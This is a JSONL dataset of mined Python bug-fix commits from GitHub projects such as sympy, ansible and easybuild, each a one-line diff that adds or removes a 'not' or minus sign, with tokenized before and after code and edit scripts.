{"project": "django-pipeline", "commit_sha": "0c0fb00fc2b418fbe94fb844d0b7cf2643528a30", "parent_sha": "6ccb5d36bcc9e8bfc9c682d961c1452a752c9443", "file_path": "pipeline/storage.py", "project_url": "https://github.com/MazMachine/django-pipeline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ class PipelineMixin(object):\n     packing = True\n \n     def __init__(self, location=None, *args, **kwargs):\n-        if settings.PIPELINE_ENABLED and location is None:\n+        if not settings.PIPELINE_ENABLED and location is None:\n             location = tempfile.mkdtemp()\n         super(PipelineMixin, self).__init__(location, *args, **kwargs)\n \n", "before": "if settings . PIPELINE_ENABLED and location is None : location = tempfile . mkdtemp ( )", "after": "if not settings . PIPELINE_ENABLED and location is None : location = tempfile . mkdtemp ( )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 42], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 12, 3, 58], 1]]"}
{"project": "drawing", "commit_sha": "f6f2cddc8c43877a5ba9daca395e347093418105", "parent_sha": "01ae1024ddd03621813bc6fe4add7e3d76caf1f9", "file_path": "src/window.py", "project_url": "https://github.com/maoschanz/drawing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -436,7 +436,7 @@ class DrawingWindow(Gtk.ApplicationWindow):\n \t\tself.options_btn.set_active(not self.options_btn.get_active())\n \n \tdef set_bottom_width_limit(self): # XXX devrait se transmettre aux panneaux custom\n-\t\tif not self.has_good_limits: # heureusement ils marchent assez bien tous seuls\n+\t\tif self.has_good_limits: # heureusement ils marchent assez bien tous seuls\n \t\t\treturn\n \t\tself.bottom_panel.show_all()\n \t\tself.limit_size_bottom = self.color_box.get_preferred_width()[0] + \\\n", "before": "if not self . has_good_limits : return", "after": "if self . has_good_limits : return", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 3, 4, 10], [\"attribute\", 3, 10, 3, 30], 1], [\"Delete\", [\"not:not\", 3, 6, 3, 9]], [\"Delete\", [\"not_operator\", 3, 6, 3, 30]]]"}
{"project": "traitsui", "commit_sha": "45b230d88deb4541d5e07fd5704fe0a0e9f9a412", "parent_sha": "546403d62ecee423b5c5c78c1be6d043d039500c", "file_path": "enthought/traits/ui/wx/range_editor.py", "project_url": "https://github.com/enthought/traitsui", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -539,7 +539,7 @@ class LargeRangeSliderEditor ( Editor ):\n         factory = self.factory\n-        if factory.low_name:\n+        if not factory.low_name:\n             self.trait_setq( low = factory.low )\n             \n         if not factory.high_name:\n", "before": "if factory . low_name : self . trait_setq ( low = factory . low )", "after": "if not factory . low_name : self . trait_setq ( low = factory . low )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 1, 9, 2, 49], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 1, 12, 1, 28], 1]]"}
{"project": "RPLCD", "commit_sha": "dbff37e88ad0ccbfeb6bf2021b09782df906d46c", "parent_sha": "6ff8655bf4476cb63094c1aeee865ab9b9bd80b1", "file_path": "RPLCD/lcd.py", "project_url": "https://github.com/dbrgn/RPLCD", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -265,7 +265,7 @@ class CharLCD(object):\n             raise ValueError('Internal _display_shift_mode has invalid value.')\n \n     def _set_write_shift_mode(self, value):\n-        if value in ShiftMode:\n+        if not value in ShiftMode:\n             raise ValueError('Write shift mode must be of ``ShiftMode`` type.')\n         self._display_shift_mode = int(value)\n         self.command(LCD_ENTRYMODESET | self._cursor_move_mode | self._display_shift_mode)\n", "before": "if value in ShiftMode : raise ValueError ( 'Write shift mode must be of ``ShiftMode`` type.' )", "after": "if not value in ShiftMode : raise ValueError ( 'Write shift mode must be of ``ShiftMode`` type.' )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 80], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 30], 1]]"}
{"project": "galaxy", "commit_sha": "2f650b88667cb343d0b64339ac48eef8a927995f", "parent_sha": "de3cff9379e1648d1c7568e91729e7cdc4f18e7f", "file_path": "tools/data_source/upload.py", "project_url": "https://github.com/snewhouse/galaxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -247,7 +247,7 @@ def add_file( dataset, registry, json_file, output_path ):\n                 #binary_ok = False\n                 parts = dataset.name.split( \".\" )\n                 if len( parts ) > 1:\n-                    ext = parts[1].strip().lower()\n+                    ext = parts[-1].strip().lower()\n                     if not Binary.is_ext_unsniffable(ext):\n                         file_err( 'The uploaded binary file contains inappropriate content', dataset, json_file )\n                         return\n", "before": "ext = parts [ 1 ] . strip ( ) . lower ( )", "after": "ext = parts [ - 1 ] . strip ( ) . lower ( )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"subscript\", 3, 27, 3, 35], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 33, 3, 34], 1]]"}
{"project": "discordbot", "commit_sha": "642af0a68c48e8943f9edac61ef22d5794d60b9c", "parent_sha": "9d9ebc2e7a991c369aa6e6225d0625a7b14dda3f", "file_path": "src/discordbot.py", "project_url": "https://github.com/1ntegrale9/discordbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -90,7 +90,7 @@ async def on_message(message):\n     try:\n         if message.author.bot:\n             return\n-        if isinstance(message.channel, discord.channel.TextChannel):\n+        if not isinstance(message.channel, discord.channel.TextChannel):\n             return\n         await parse(message)\n         await client.process_commands(message)\n", "before": "if isinstance ( message . channel , discord . channel . TextChannel ) : return", "after": "if not isinstance ( message . channel , discord . channel . TextChannel ) : return", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 19], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 68], 1]]"}
{"project": "scroller", "commit_sha": "92085bf8b0c8aea813f7d0b59af5f4d085a30417", "parent_sha": "d7bf3074d9a62b10d4e36cf106a73c2c66f4a7dc", "file_path": "scroller/GameObjects.py", "project_url": "https://github.com/darbaga/scroller", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4,7 +4,7 @@ This class holds game object classes\n class BaseGameObj(object):\n     \"\"\"Basic game object template\"\"\"\n     def __init__(self, name='', description='', getsound='', dropsound='', effects=[], *args, **kwargs):\n-        if name and description and getsound and dropsound  and effects:\n+        if not name and description and getsound and dropsound  and effects:\n             self.name, self.description = kwargs['name'], kwargs['description']\n             self.getsound, self.dropsound = kwargs['getsound'], kwargs['dropsound']\n             self.effects = kwargs['effects']\n", "before": "if name and description and getsound and dropsound and effects : self . name , self . description = kwargs [ 'name' ] , kwargs [ 'description' ] self . getsound , self . dropsound = kwargs [ 'getsound' ] , kwargs [ 'dropsound' ] self . effects = kwargs [ 'effects' ]", "after": "if not name and description and getsound and dropsound and effects : self . name , self . description = kwargs [ 'name' ] , kwargs [ 'description' ] self . getsound , self . dropsound = kwargs [ 'getsound' ] , kwargs [ 'dropsound' ] self . effects = kwargs [ 'effects' ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 45], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"boolean_operator\", 3, 12, 3, 72], 1]]"}
{"project": "ansible", "commit_sha": "9509224768de3d92a2abaddd75fa55e24eaaee78", "parent_sha": "56211bd7ed3a9c7909d3e65b30e31cbf8f4de89a", "file_path": "lib/ansible/modules/database/postgresql/postgresql_db.py", "project_url": "https://github.com/partis/ansible", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -288,11 +288,11 @@ def main():\n     try:\n         if module.check_mode:\n             if state == \"absent\":\n-                changed = not db_exists(cursor, db)\n+                changed = db_exists(cursor, db)\n             elif state == \"present\":\n                 changed = not db_matches(cursor, db, owner, template, encoding,\n                                          lc_collate, lc_ctype)\n-            module.exit_json(changed=changed,db=db)\n+            module.exit_json(changed=changed, db=db)\n \n         if state == \"absent\":\n             try:\n", "before": "changed = not db_exists ( cursor , db )", "after": "changed = db_exists ( cursor , db )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"assignment\", 3, 17, 3, 52], [\"call\", 3, 31, 3, 52], 2], [\"Delete\", [\"not:not\", 3, 27, 3, 30]], [\"Delete\", [\"not_operator\", 3, 27, 3, 52]]]"}
{"project": "cosmolisa", "commit_sha": "d183dc94bce9bf1f42580da29e70cdfaf2dad23b", "parent_sha": "d8a240fa89ad40f41b781cc69c67f7e52a7127c3", "file_path": "cosmological_model.py", "project_url": "https://github.com/wdpozzo/cosmolisa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ class CosmologicalModel(cpnest.model.Model):\n         elif self.model == \"DE\":\n             \n             self.names  = ['w0','w1']\n-            self.bounds = [[-3.0,0.3],[-1.0,1.0]]\n+            self.bounds = [[-3.0,-0.3],[-1.0,1.0]]\n         \n         else:\n             \n", "before": "self . bounds = [ [ - 3.0 , 0.3 ] , [ - 1.0 , 1.0 ] ]", "after": "self . bounds = [ [ - 3.0 , - 0.3 ] , [ - 1.0 , 1.0 ] ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"list\", 3, 28, 3, 38], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"float:0.3\", 3, 34, 3, 37], 1]]"}
{"project": "goagent", "commit_sha": "327616ba9a2f67aa6843c3833568a12a6da45e35", "parent_sha": "23f92ff82bcc97c308f31f33da170ee614d0f43f", "file_path": "local/proxy.py", "project_url": "https://github.com/Wingge/goagent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -574,7 +574,7 @@ class Http(object):\n \n     def _request(self, sock, method, path, protocol_version, headers, payload, bufsize=8192, crlf=None, return_sock=None):\n         skip_headers = self.skip_headers\n-        request_data = '\\r\\n' * (self.crlf if crlf is None else crlf)\n+        request_data = '\\r\\n' * (self.crlf if not crlf is None else crlf)\n         request_data += '%s %s %s\\r\\n' % (method, path, protocol_version)\n         request_data += ''.join('%s: %s\\r\\n' % (k, v) for k, v in headers.iteritems() if k not in skip_headers)\n         if self.proxy:\n", "before": "request_data = '\\r\\n' * ( self . crlf if crlf is None else crlf )", "after": "request_data = '\\r\\n' * ( self . crlf if not crlf is None else crlf )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"conditional_expression\", 3, 34, 3, 69], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"comparison_operator\", 3, 47, 3, 59], 1]]"}
{"project": "Phoenix", "commit_sha": "1dcd1772cd64aab42afd89c5380bb44f3f2f5db3", "parent_sha": "fe028d7dad571bbe8cc8a466edfbfd84f9d76935", "file_path": "wx/lib/agw/aui/auibar.py", "project_url": "https://github.com/wxWidgets/Phoenix", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1126,7 +1126,7 @@ class AuiDefaultToolBarArt(object):\n             bmp = item.GetBitmap()\n             dropbmp = self._button_dropdown_bmp\n \n-        if not bmp.IsOk():\n+        if bmp.IsOk():\n             dc.DrawBitmap(bmp, bmp_rect.x, bmp_rect.y, True)\n \n         if horizontal:\n", "before": "if not bmp . IsOk ( ) : dc . DrawBitmap ( bmp , bmp_rect . x , bmp_rect . y , True )", "after": "if bmp . IsOk ( ) : dc . DrawBitmap ( bmp , bmp_rect . x , bmp_rect . y , True )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"if_statement\", 3, 9, 4, 61], [\"call\", 3, 16, 3, 26], 1], [\"Delete\", [\"not:not\", 3, 12, 3, 15]], [\"Delete\", [\"not_operator\", 3, 12, 3, 26]]]"}
{"project": "sympy", "commit_sha": "a14e9f8286745c629d13d411b3143847e7ad0d25", "parent_sha": "6774483d9977c02b117751f0d85393ef0c62dfb6", "file_path": "sympy/solvers/recurr.py", "project_url": "https://github.com/ylemkimon/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -729,7 +729,7 @@ def rsolve(f, y, init=None):\n     K_max = max(H_part.iterkeys())\n     coeffs = [H_part[i] for i in xrange(K_max+1)]\n \n-    result = rsolve_hyper(coeffs, i_part, n, symbols=True)\n+    result = rsolve_hyper(coeffs, -i_part, n, symbols=True)\n \n     if result is None:\n         return None\n", "before": "result = rsolve_hyper ( coeffs , i_part , n , symbols = True )", "after": "result = rsolve_hyper ( coeffs , - i_part , n , symbols = True )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 26, 3, 59], [\"unary_operator\", \"N0\"], 3], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:i_part\", 3, 35, 3, 41], 1]]"}
{"project": "sympy", "commit_sha": "bd1b025a5f7d2b79848c9b5b3145563de3b6086b", "parent_sha": "d1993f18f5d99bb2bde42cfbd0dd8cfa055fae8e", "file_path": "sympy/algebras/tests/test_quaternion.py", "project_url": "https://github.com/ylemkimon/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def test_quaternion_functions():\n     assert q.normalize() == Quaternion(x, y, z, w) / sqrt(w**2 + x**2 + y**2 + z**2)\n     assert q.inverse() == Quaternion(x, -y, -z, -w) / (w**2 + x**2 + y**2 + z**2)\n     assert q.pow(2) == Quaternion(-w**2 + x**2 - y**2 - z**2, 2*x*y, 2*x*z, 2*w*x)\n-    assert q1.pow(2) == Quaternion(-(7/225), -(1/225), -(1/150), -(2/225))\n+    assert q1.pow(-2) == Quaternion(-(7/225), -(1/225), -(1/150), -(2/225))\n \n     assert q1.exp() == \\\n     Quaternion(E * cos(sqrt(29)),\n", "before": "assert q1 . pow ( 2 ) == Quaternion ( - ( 7 / 225 ) , - ( 1 / 225 ) , - ( 1 / 150 ) , - ( 2 / 225 ) )", "after": "assert q1 . pow ( - 2 ) == Quaternion ( - ( 7 / 225 ) , - ( 1 / 225 ) , - ( 1 / 150 ) , - ( 2 / 225 ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 18, 3, 21], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:2\", 3, 19, 3, 20], 1]]"}
{"project": "sympy", "commit_sha": "852f49f3d42894e383d883c7d8855ef16115fc8a", "parent_sha": "40c0d6e1f7716973b599ffa7bb4f0fa7d7683a2f", "file_path": "sympy/concrete/guess.py", "project_url": "https://github.com/jaimahajan1997/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -301,7 +301,7 @@ def guess_generating_function(v, X=Symbol('x'), types=['all'], maxsqrtn=2):\n     # Logarithmic Generating Function (lgf)\n     if 'lgf' in types:\n         # Transform sequence (multiplication by (-1)^(n+1) / n)\n-        w, f = [], Integer(1)\n+        w, f = [], Integer(-1)\n         for i, k in enumerate(v):\n             f = -f\n             w.append(f*k/Integer(i+1))\n", "before": "w , f = [ ] , Integer ( 1 )", "after": "w , f = [ ] , Integer ( - 1 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 30], [\"unary_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 28, 3, 29], 1]]"}
{"project": "Printrun", "commit_sha": "b2e4c731ac59e99b278c1dd9f4717d3b583a67dc", "parent_sha": "1fa10b65e63d3ec174ee5eabca7dcb1bab68b6a4", "file_path": "plater.py", "project_url": "https://github.com/SpringCreekMakers/Printrun", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class showstl(wx.Window):\n                 \n                 r=i.rot\n                 o=i.offsets\n-                sf.write('translate([%s,%s,%s]) rotate([0,0,%s]) import_stl(\"%s\");\\n'%(str(o[0]),str(o[1]),str(o[2]),-r,os.path.split(i.filename)[1]))\n+                sf.write('translate([%s,%s,%s]) rotate([0,0,%s]) import_stl(\"%s\");\\n'%(str(o[0]),str(o[1]),str(o[2]),r,os.path.split(i.filename)[1]))\n                 if r != 0:\n                     i=i.rotate([0,0,-r])\n                 if o != [0,0,0]:\n", "before": "sf . write ( 'translate([%s,%s,%s]) rotate([0,0,%s]) import_stl(\"%s\");\\n' % ( str ( o [ 0 ] ) , str ( o [ 1 ] ) , str ( o [ 2 ] ) , - r , os . path . split ( i . filename ) [ 1 ] ) )", "after": "sf . write ( 'translate([%s,%s,%s]) rotate([0,0,%s]) import_stl(\"%s\");\\n' % ( str ( o [ 0 ] ) , str ( o [ 1 ] ) , str ( o [ 2 ] ) , r , os . path . split ( i . filename ) [ 1 ] ) )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"tuple\", 3, 87, 3, 150], [\"identifier:r\", 3, 119, 3, 120], 7], [\"Delete\", [\"-:-\", 3, 118, 3, 119]], [\"Delete\", [\"unary_operator\", 3, 118, 3, 120]]]"}
{"project": "sympy", "commit_sha": "d6144963aad6f8b2c579ca43d08ea8617e5134cf", "parent_sha": "06b8314c657814275be88bd272bc8983ee22395b", "file_path": "sympy/rubi/tests/test_utility_function.py", "project_url": "https://github.com/ylemkimon/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1396,7 +1396,7 @@ def test_TryPureTanhSubst():\n     assert not TryPureTanhSubst(log(x), x)\n     assert TryPureTanhSubst(sin(x), x)\n     assert not TryPureTanhSubst(atanh(a*tanh(x)), x)\n-    assert TryPureTanhSubst((a + b*x)**S(2), x)\n+    assert not TryPureTanhSubst((a + b*x)**S(2), x)\n \n def test_TryTanhSubst():\n     assert not TryTanhSubst(log(x), x)\n", "before": "assert TryPureTanhSubst ( ( a + b * x ) ** S ( 2 ) , x )", "after": "assert not TryPureTanhSubst ( ( a + b * x ) ** S ( 2 ) , x )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"assert_statement\", 3, 5, 3, 48], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 12, 3, 48], 1]]"}
{"project": "PyUAVSim", "commit_sha": "a24bb0dba98101f1e09198f8676a07b99a421f1e", "parent_sha": "f3399298ac7621f499d47559eb956990c49b5df4", "file_path": "apps/fixedwing_uav_altitude_hold_using_pitch.py", "project_url": "https://github.com/SimulatorWorks/PyUAVSim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ class AppFixedWingRollAttHolder(FixedWingUAV):\n         K_theta_dc = (kp_theta * atheta_3)/(atheta_2 + kp_theta * atheta_3)\n         self.autopilot.altitude_hold_controller.kp = 2.0 * zeta * omega_h/(K_theta_dc * Va)\n         self.autopilot.heading_hold_controller.ki = omega_h**2 /(K_theta_dc * Va)\n-        h = self.dynamics.x[2]\n+        h = -self.dynamics.x[2]\n         pitch_c = self.autopilot.compute_pitch(h_c, h)\n         return pitch_c\n         \n", "before": "h = self . dynamics . x [ 2 ]", "after": "h = - self . dynamics . x [ 2 ]", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 31], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"subscript\", 3, 13, 3, 31], 1]]"}
{"project": "easybuild-framework", "commit_sha": "fba633667a66a8e09e1509b9ead71a24d3a9ca43", "parent_sha": "fec9c4e3bb81be3e62f4fd6e9197cf0a89be6884", "file_path": "easybuild/easyblocks/b/boost.py", "project_url": "https://github.com/ComputeCanada/easybuild-framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class Boost(Application):\n         \"\"\"Configure Boost build using custom tools\"\"\"\n \n         # mpi sanity check\n-        if self.getcfg('boost_mpi') and self.tk.opts['usempi']:\n+        if self.getcfg('boost_mpi') and not self.tk.opts['usempi']:\n             self.log.error(\"When enabling building boost_mpi, also enable the 'usempi' toolkit option.\")\n \n         # create build directory (Boost doesn't like being built in source dir)\n", "before": "if self . getcfg ( 'boost_mpi' ) and self . tk . opts [ 'usempi' ] : self . log . error ( \"When enabling building boost_mpi, also enable the 'usempi' toolkit option.\" )", "after": "if self . getcfg ( 'boost_mpi' ) and not self . tk . opts [ 'usempi' ] : self . log . error ( \"When enabling building boost_mpi, also enable the 'usempi' toolkit option.\" )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 63], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"subscript\", 3, 41, 3, 63], 1]]"}
{"project": "ckanext-harvest", "commit_sha": "7b6beb14704f4fd2606583cffed60bd40b406741", "parent_sha": "01dfda59b68de5acc43da9f189a355ff7cf5d304", "file_path": "ckanext/harvest/logic/action/get.py", "project_url": "https://github.com/DataShades/ckanext-harvest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -283,7 +283,7 @@ def _get_sources_for_user(context,data_dict):\n \n     user_obj = User.get(user)\n     # Sysadmins will get all sources\n-    if user_obj and user_obj.sysadmin:\n+    if user_obj and not user_obj.sysadmin:\n         # This only applies to a non sysadmin user when using the\n         # publisher auth profile. When using the default profile,\n         # normal users will never arrive at this point, but even if they\n", "before": "if user_obj and user_obj . sysadmin : ", "after": "if user_obj and not user_obj . sysadmin : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 38], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 21, 3, 38], 1]]"}
{"project": "ckanext-harvest", "commit_sha": "f63140354d73bc3b477cd26a2afadb5af541cfd4", "parent_sha": "52c071dbe96d4b591564b5dd3a806af7a4fea087", "file_path": "ckanext/harvest/harvesters/ckanharvester.py", "project_url": "https://github.com/DataShades/ckanext-harvest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -205,7 +205,7 @@ class CKANHarvester(HarvesterBase):\n                          'gave an error: %s', e)\n                 get_all_packages = True\n \n-            if not get_all_packages and pkg_dicts:\n+            if not get_all_packages and not pkg_dicts:\n                 log.info('No datasets have been updated on the remote '\n                          'CKAN instance since the last harvest job %s',\n                          last_time)\n", "before": "if not get_all_packages and pkg_dicts : log . info ( 'No datasets have been updated on the remote ' 'CKAN instance since the last harvest job %s' , last_time )", "after": "if not get_all_packages and not pkg_dicts : log . info ( 'No datasets have been updated on the remote ' 'CKAN instance since the last harvest job %s' , last_time )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 20, 3, 50], [\"not_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:pkg_dicts\", 3, 41, 3, 50], 1]]"}
{"project": "easybuild-framework", "commit_sha": "a347fb14082cf85f91505147f45e1dc89b223721", "parent_sha": "b67a66956359e3ce269c4ecdf3377e8503ff7d4b", "file_path": "easybuild/framework/easyconfig/easyconfig.py", "project_url": "https://github.com/ComputeCanada/easybuild-framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -587,7 +587,7 @@ class EasyConfig(object):\n             raise EasyBuildError(msg, key, value)\n \n         # For dictionaries, input value cannot be a string; must be iterable\n-        if isinstance(self[key], dict) and not isinstance(value, string_type):\n+        if isinstance(self[key], dict) and isinstance(value, string_type):\n             msg = \"Can't update configuration value for %s, because the attempted\"\n             msg += \"update value, '%s', is not iterable (list, tuple, dict).\"\n             raise EasyBuildError(msg, key, value)\n", "before": "if isinstance ( self [ key ] , dict ) and not isinstance ( value , string_type ) : msg = \"Can't update configuration value for %s, because the attempted\" msg += \"update value, '%s', is not iterable (list, tuple, dict).\" raise EasyBuildError ( msg , key , value )", "after": "if isinstance ( self [ key ] , dict ) and isinstance ( value , string_type ) : msg = \"Can't update configuration value for %s, because the attempted\" msg += \"update value, '%s', is not iterable (list, tuple, dict).\" raise EasyBuildError ( msg , key , value )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 12, 3, 78], [\"call\", 3, 48, 3, 78], 2], [\"Delete\", [\"not:not\", 3, 44, 3, 47]], [\"Delete\", [\"not_operator\", 3, 44, 3, 78]]]"}
{"project": "easybuild-framework", "commit_sha": "64e95f23d6b6d811f3e46186f883a4f6c7aa8fef", "parent_sha": "e2f270af2486711d6926585cb49d2a05ee253f25", "file_path": "test/framework/options.py", "project_url": "https://github.com/ComputeCanada/easybuild-framework", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2072,7 +2072,7 @@ class CommandLineOptionsTest(EnhancedTestCase):\n                      verbose=True, raise_error=True)\n         outtxt = self.get_stdout()\n         errtxt = self.get_stderr()\n-        self.assertTrue( + r'foo-1.2.3-gompi-2018a.eb copied to ' + tweaked_ecs_dir in outtxt)\n+        self.assertTrue(r'foo-1.2.3-gompi-2018a.eb copied to ' + tweaked_ecs_dir in outtxt)\n         self.assertFalse(errtxt)\n         self.mock_stdout(False)\n         self.mock_stderr(False)\n", "before": "self . assertTrue ( + r'foo-1.2.3-gompi-2018a.eb copied to ' + tweaked_ecs_dir in outtxt )", "after": "self . assertTrue ( r'foo-1.2.3-gompi-2018a.eb copied to ' + tweaked_ecs_dir in outtxt )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Move\", [\"binary_operator\", 3, 26, 3, 84], [\"string:r'foo-1.2.3-gompi-2018a.eb copied to '\", 3, 28, 3, 66], 0], [\"Delete\", [\"+:+\", 3, 26, 3, 27]], [\"Delete\", [\"unary_operator\", 3, 26, 3, 66]]]"}
{"project": "electrum-exe", "commit_sha": "3f6d08292d9e87f05a95bade7002044be1239377", "parent_sha": "a94708495904802c8d4eaf0108cdf70256b4051e", "file_path": "lib/bitcoin.py", "project_url": "https://github.com/fukukami/electrum-exe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -397,7 +397,7 @@ def raw_tx( inputs, outputs, for_sig = None ):\n         s += var_int( len(tx_filter(script))/2 )                #  script length\n         s += script                                             #  script\n     s += int_to_hex(0,4)                                        #  lock time\n-    if for_sig is not None and for_sig != 1: s += int_to_hex(1, 4)               #  hash type\n+    if for_sig is not None and for_sig != -1: s += int_to_hex(1, 4)               #  hash type\n     return tx_filter(s)\n \n \n", "before": "if for_sig is not None and for_sig != 1 : s += int_to_hex ( 1 , 4 )", "after": "if for_sig is not None and for_sig != - 1 : s += int_to_hex ( 1 , 4 )", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 32, 3, 44], [\"unary_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"-:-\", \"T\"], 0], [\"Move\", \"N0\", [\"integer:1\", 3, 43, 3, 44], 1]]"}
{"project": "neon", "commit_sha": "224cb8996aea84ca30f3c30cd2caa8a865f8230e", "parent_sha": "faeeb0517621a166cdb83e523aad7ea3b03a96a5", "file_path": "examples/faster-rcnn/faster_rcnn.py", "project_url": "https://github.com/azuret/neon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ def build_model(dataset, frcn_rois_per_img, inference=False):\n     RPN_1x1_bbox = Conv((1, 1, 36), activation=Identity(), padding=0, **rpn_init)\n \n     # inference uses different network settings\n-    if inference:\n+    if not inference:\n         pre_nms_N = 12000\n         post_nms_N = 2000\n     else:\n", "before": "if inference : pre_nms_N = 12000 post_nms_N = 2000 else : ", "after": "if not inference : pre_nms_N = 12000 post_nms_N = 2000 else : ", "sstub_pattern": "CHANGE_UNARY_OPERATOR", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 6, 10], [\"not_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:inference\", 3, 8, 3, 17], 1]]"}
